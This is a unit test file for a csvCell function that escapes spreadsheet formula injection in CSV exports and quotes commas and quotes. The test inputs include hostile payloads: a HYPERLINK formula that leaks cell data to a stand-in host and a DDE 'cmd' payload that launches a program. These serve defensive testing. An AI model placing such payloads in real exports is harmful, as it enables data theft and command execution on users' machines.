import { describe, expect, it } from "vitest";
import { csvCell } from "./csv-cell";

describe("a CSV cell opened in Excel", () => {
  it("makes text that would run as a formula plain", () => {
    expect(csvCell('=HYPERLINK("https://evil.test/?"&A1,"Click")')).toBe(`"'=HYPERLINK(""https://evil.test/?""&A1,""Click"")"`);
    expect(csvCell("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
    expect(csvCell("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
    expect(csvCell("-2+3")).toBe("'-2+3");
    expect(csvCell("\t=1+1")).toBe("'\t=1+1");
  });

  it("leaves numbers as numbers, negative ones included", () => {
    expect(csvCell(-1.5)).toBe("-1.5");
    expect(csvCell("-1.50")).toBe("-1.50");
    expect(csvCell("+8")).toBe("+8");
    expect(csvCell("12.25")).toBe("12.25");
  });

  it("quotes commas, quotes and line breaks, and leaves ordinary text alone", () => {
    expect(csvCell("Martinez, Ismael")).toBe('"Martinez, Ismael"');
    expect(csvCell('Said "yes"')).toBe('"Said ""yes"""');
    expect(csvCell("Vacation")).toBe("Vacation");
    expect(csvCell(null)).toBe("");
    expect(csvCell("2026-10-21")).toBe("2026-10-21");
  });
});
